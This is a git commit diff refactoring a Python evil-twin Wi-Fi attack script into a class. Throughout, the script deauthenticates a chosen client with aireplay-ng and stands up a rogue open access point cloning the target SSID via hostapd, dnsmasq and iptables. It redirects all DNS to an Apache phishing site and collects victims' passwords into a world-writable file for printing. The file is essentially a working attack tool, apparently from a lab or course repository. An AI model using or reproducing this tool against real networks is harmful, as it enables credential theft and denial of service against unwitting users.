d18fafdee3976c4b2da077e897d96447fa691eb5
arielbark9 <arielbark9@gmail.com>
2022-05-09 13:39:24 -0400

    finish

--- WPA-Attacks/evil-twin.py
+++ WPA-Attacks/evil-twin.py
@@ -11,7 +11,6 @@ clients = []
 client_to_attack = None
 done_scanning = False
 
-
 def bash(cmd):
     return os.popen(cmd).read()
 
@@ -48,17 +47,7 @@ def callback_ap(pkt):
             print(f"\t[+] Found new access point: {bssid} {ssid}")
 
 
-def scan_for_aps(interface):
-    #  scan for nearby access points for 60 seconds
-    channel_changer = Thread(target=change_channel, args=(interface,))
-    channel_changer.daemon = True
-    channel_changer.start()
-    sniff(prn=callback_ap, iface=interface, timeout=1)
-    global done_scanning
-    done_scanning = True
-
-
-def scan_for_clients(pkt):
+def callback_client(pkt):
     #  get all clients associated with access point
     global clients
     if pkt.haslayer(Dot11):
@@ -67,58 +56,6 @@ def scan_for_clients(pkt):
                 if pkt.type in [1, 2]:  # the type I'm looking for
                     if pkt.addr2 not in clients and pkt.addr2 != '':
                         clients.append(pkt.addr2)
-
-
-def setup_hostapd_conf(interface):
-    #  set up hostapd.conf for an open network
-    print("[*] Setting up hostapd.conf for an open network")
-    with open("/etc/hostapd/hostapd.conf", "w") as f:
-        f.write("interface=%s\n" % interface)
-        f.write("ssid=%s\n" % ap_to_attack[1])
-        f.write("driver=nl80211\n")
-        f.write("hw_mode=g\n")
-        f.write("channel=1\n")
-        f.write("ieee80211n=1\n")
-        f.write("macaddr_acl=0\n")
-        f.write("auth_algs=1\n")
-
-
-def setup_dnsmasq_conf(interface):
-    #  set up dnsmasq.conf for DHCP server
-    print("[*] Setting up dnsmasq.conf for DHCP server")
-    with open("/etc/dnsmasq.conf", "w") as f:
-        f.write("no-resolv\n")
-        f.write("interface=%s\n" % interface)
-        f.write("dhcp-range=192.168.1.2,192.168.1.150,12h\n")
-        f.write("dhcp-option=3,192.168.1.1\n")  # gw
-        f.write("dhcp-option=6,192.168.1.1\n")  # dns
-        f.write(f"address=/#/192.168.1.1\n")
-        f.write("server=8.8.8.8\n")
-
-
-def setup_iptables(interface):
-    #  set up iptables for access point
-    bash("iptables -t nat -A POSTROUTING -o wlp2s0 -j MASQUERADE")
-    bash(f"iptables -A FORWARD -i {interface} -o wlp2s0 -j ACCEPT")
-    bash("sysctl net.ipv4.ip_forward=1")
-
-
-def setup_ap(interface):
-    #  set up access point for client to connect to using hostapd
-    print("[*] Setting up access point for client to connect to")
-    #  set up hostapd.conf
-    setup_hostapd_conf(interface)
-    bash(f"hostapd -B /etc/hostapd/hostapd.conf &")
-    #  set up dnsmasq.conf
-    bash(f"ifconfig {interface} up 192.168.1.1/24 netmask 255.255.255.0")
-    bash("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
-    print("[*] Setting up dhcp server")
-    setup_dnsmasq_conf(interface)
-    bash(f"dnsmasq -C /etc/dnsmasq.conf")
-    #  set up iptables
-    print("[*] Setting up iptables")
-    setup_iptables(interface)
-    print("[*] Access point is up and ready")
 
 
 def killall():
@@ -135,101 +72,161 @@ def killall():
     bash("systemctl stop apache2")
 
 
-def start_evil_twin(interface):
-    global ap_list, clients, ap_to_attack, client_to_attack
-    #  enable monitor mode
-    print("[*] Enabling monitor mode")
-    enable_monitor_mode(interface)
+class EvilTwin:
+    def __init__(self, iface):
+        self.interface = iface
 
-    #  scan for nearby access points
-    print("[*] Scanning for nearby access points")
-    scan_for_aps(interface)
-    ap_list.append(("00:00:00:00:00:00", "test"))
-    print(f"[*] Found {len(ap_list)} access points")
+    def scan_for_aps(self):
+        #  scan for nearby access points for 60 seconds
+        channel_changer = Thread(target=change_channel, args=(self.interface,))
+        channel_changer.daemon = True
+        channel_changer.start()
+        sniff(prn=callback_ap, iface=self.interface, timeout=20)
+        global done_scanning
+        done_scanning = True
 
-    #  prompt user for access point to attack
-    print("[*] Please choose an access point to attack")
-    for ap, i in zip(ap_list, range(len(ap_list))):
-        print(f"\t[{i + 1}] {ap[0]} {ap[1]}")
+    def setup_hostapd_conf(self):
+        #  set up hostapd.conf for an open network
+        print("[*] Setting up hostapd.conf for an open network")
+        with open("/etc/hostapd/hostapd.conf", "w") as f:
+            f.write("interface=%s\n" % self.interface)
+            f.write("ssid=%s\n" % ap_to_attack[1])
+            f.write("driver=nl80211\n")
+            f.write("hw_mode=g\n")
+            f.write("channel=1\n")
+            f.write("ieee80211n=1\n")
+            f.write("macaddr_acl=0\n")
+            f.write("auth_algs=1\n")
 
-    while True:
-        i = int(input("[>] "))
-        if i not in range(1, len(ap_list) + 1):
-            print("[!] Please enter a valid access point")
-        else:
-            ap_to_attack = ap_list[i - 1]
-            break
+    def setup_dnsmasq_conf(self):
+        #  set up dnsmasq.conf for DHCP server
+        print("[*] Setting up dnsmasq.conf for DHCP server")
+        with open("/etc/dnsmasq.conf", "w") as f:
+            f.write("no-resolv\n")
+            f.write("interface=%s\n" % self.interface)
+            f.write("dhcp-range=192.168.1.2,192.168.1.150,12h\n")
+            f.write("dhcp-option=3,192.168.1.1\n")  # gw
+            f.write("dhcp-option=6,192.168.1.1\n")  # dns
+            f.write(f"address=/#/192.168.1.1\n")
+            f.write("server=8.8.8.8\n")
 
-    #  get all clients of access point and prompt user for client to attack
-    print("[*] Getting all clients of access point")
-    sniff(iface=interface, prn=scan_for_clients, timeout=10)
-    print(f"[*] Found {len(clients)} clients")
-    print("[*] Please choose a client to attack")
-    for client, i in zip(clients, range(len(clients))):
-        print(f"\t[{i + 1}] {client}")
+    def setup_iptables(self):
+        #  set up iptables for access point
+        bash("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
+        bash(f"iptables -A FORWARD -i {self.interface} -o eth0 -j ACCEPT")
+        bash("sysctl net.ipv4.ip_forward=1")
 
-    while True:
-        i = int(input("[>] "))
-        if i not in range(1, len(clients) + 1):
-            print("[!] Please enter a valid client")
-        else:
-            client_to_attack = clients[i - 1]
-            break
+    def setup_ap(self):
+        #  set up access point for client to connect to using hostapd
+        print("[*] Setting up access point for client to connect to")
+        #  set up hostapd.conf
+        self.setup_hostapd_conf()
+        bash(f"hostapd -B /etc/hostapd/hostapd.conf &")
+        #  set up dnsmasq.conf
+        bash(f"ifconfig {self.interface} up 192.168.1.1/24 netmask 255.255.255.0")
+        bash("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
+        print("[*] Setting up dhcp server")
+        self.setup_dnsmasq_conf()
+        bash(f"dnsmasq -C /etc/dnsmasq.conf")
+        #  set up iptables
+        print("[*] Setting up iptables")
+        self.setup_iptables()
+        print("[*] Access point is up and ready")
 
-    # deauth for 10 seconds
-    print("[*] Starting deauth attack for 10 seconds")
-    de_auth_client(interface, 10)
+    def setup_apache_server(self):
+        #  set up apache2 configuration
+        print("[*] Setting up apache2 configuration")
+        with open("/etc/apache2/sites-enabled/000-default.conf", "w") as f:
+            f.write("<VirtualHost *:80>\n")
+            f.write("\tServerAdmin webmaster@localhost\n")
+            f.write("\tDocumentRoot /var/www/html\n")
+            f.write("\tErrorLog ${APACHE_LOG_DIR}/error.log\n")
+            f.write("\tCustomLog ${APACHE_LOG_DIR}/access.log combined\n")
+            f.write("</VirtualHost>\n")
+            f.write('<Directory "/var/www/html">\n')
+            f.write("\tRewriteEngine On\n")
+            f.write("\tRewriteBase /\n")
+            f.write("\tRewriteCond %{HTTP_HOST} ^www\\.(.*)$ [NC]\n")
+            f.write("\tRewriteRule ^(.*)$ http://%1/$1 [R=301,L]\n")
+            f.write("\n\tRewriteCond %{REQUEST_FILENAME} !-f\n")
+            f.write("\tRewriteCond %{REQUEST_FILENAME} !-d\n")
+            f.write("\tRewriteRule ^(.*)$ / [L,QSA]\n")
+            f.write("</Directory>\n")
+        #  set up apache server
+        bash("cp -r `pwd`/website/* /var/www/html/")
+        bash("touch /home/kali/Desktop/password.txt")
+        bash("chmod 777 /home/kali/Desktop/password.txt")
+        bash("a2enmod rewrite && service apache2 start")
 
-    #  set up access point for client to connect to
-    setup_ap(interface)
+    def de_auth_client(self, t):
+        """
+        aireplay is a tool that deauthenticates clients from an access point
+        use aireplay-ng to deauth clients for t seconds
+        """
+        bash(f"aireplay-ng -0 {t} -a {ap_to_attack[0]} -c {client_to_attack} {self.interface}")
 
-    #  start apache server
-    print("[*] Starting apache server")
-    setup_apache_server()
+    def start_evil_twin(self):
+        global ap_list, clients, ap_to_attack, client_to_attack
+        #  enable monitor mode
+        print("[*] Enabling monitor mode")
+        enable_monitor_mode(self.interface)
 
-    # enter p to print collected password or q to exit
-    while True:
-        choice = input("enter p to print collected password or q to exit: ")
-        if choice == "p":
-            bash("cat ~/Desktop/password.txt")
-        elif choice == "q":
-            break
+        #  scan for nearby access points
+        print("[*] Scanning for nearby access points")
+        self.scan_for_aps()
+        ap_list.append(("00:00:00:00:00:00", "test"))
+        print(f"[*] Found {len(ap_list)} access points")
 
-    killall()
+        #  prompt user for access point to attack
+        print("[*] Please choose an access point to attack")
+        for ap, i in zip(ap_list, range(len(ap_list))):
+            print(f"\t[{i + 1}] {ap[0]} {ap[1]}")
 
+        while True:
+            i = int(input("[>] "))
+            if i not in range(1, len(ap_list) + 1):
+                print("[!] Please enter a valid access point")
+            else:
+                ap_to_attack = ap_list[i - 1]
+                break
 
-def setup_apache_server():
-    #  set up apache2 configuration
-    print("[*] Setting up apache2 configuration")
-    with open("/etc/apache2/sites-enabled/000-default.conf", "w") as f:
-        f.write("<VirtualHost *:80>\n")
-        f.write("\tServerAdmin webmaster@localhost\n")
-        f.write("\tDocumentRoot /var/www/html\n")
-        f.write("\tErrorLog ${APACHE_LOG_DIR}/error.log\n")
-        f.write("\tCustomLog ${APACHE_LOG_DIR}/access.log combined\n")
-        f.write("</VirtualHost>\n")
-        f.write('<Directory "/var/www/html">\n')
-        f.write("\tRewriteEngine On\n")
-        f.write("\tRewriteBase /\n")
-        f.write("\tRewriteCond %{HTTP_HOST} ^www\\.(.*)$ [NC]\n")
-        f.write("\tRewriteRule ^(.*)$ http://%1/$1 [R=301,L]\n")
-        f.write("\n\tRewriteCond %{REQUEST_FILENAME} !-f\n")
-        f.write("\tRewriteCond %{REQUEST_FILENAME} !-d\n")
-        f.write("\tRewriteRule ^(.*)$ / [L,QSA]\n")
-        f.write("</Directory>\n")
-    #  set up apache server
-    bash("cp -r `pwd`/website/* /var/www/html/")
-    bash("touch /home/kali/Desktop/password.txt")
-    bash("chmod 777 /home/kali/Desktop/password.txt")
-    bash("a2enmod rewrite && service apache2 start")
+        #  get all clients of access point and prompt user for client to attack
+        print("[*] Getting all clients of access point")
+        sniff(iface=self.interface, prn=callback_client, timeout=10)
+        clients.append("00:00:00:00:00:00")
+        print(f"[*] Found {len(clients)} clients")
+        print("[*] Please choose a client to attack")
+        for client, i in zip(clients, range(len(clients))):
+            print(f"\t[{i + 1}] {client}")
 
+        while True:
+            i = int(input("[>] "))
+            if i not in range(1, len(clients) + 1):
+                print("[!] Please enter a valid client")
+            else:
+                client_to_attack = clients[i - 1]
+                break
 
-def de_auth_client(interface, t):
-    """
-    aireplay is a tool that deauthenticates clients from an access point
-    use aireplay-ng to deauth clients for t seconds
-    """
-    bash(f"aireplay-ng -0 {t} -a {ap_to_attack[0]} -c {client_to_attack} {interface}")
+        # deauth for 10 seconds
+        print("[*] Starting deauth attack for 10 seconds")
+        self.de_auth_client(10)
+
+        #  set up access point for client to connect to
+        self.setup_ap()
+
+        #  start apache server
+        print("[*] Starting apache server")
+        self.setup_apache_server()
+
+        # enter p to print collected password or q to exit
+        while True:
+            c = input("enter p to print collected password or q to exit: ")
+            if c == "p":
+                print(open("/home/kali/Desktop/password.txt", 'r').read())
+            elif c == "q":
+                break
+
+        killall()
 
 
 def main():
@@ -248,7 +245,8 @@ def main():
             interface = get_if_list()[i - 1]
             break
     #  start evil twin attack
-    start_evil_twin(interface)
+    e = EvilTwin(interface)
+    e.start_evil_twin()
 
 
 if __name__ == "__main__":
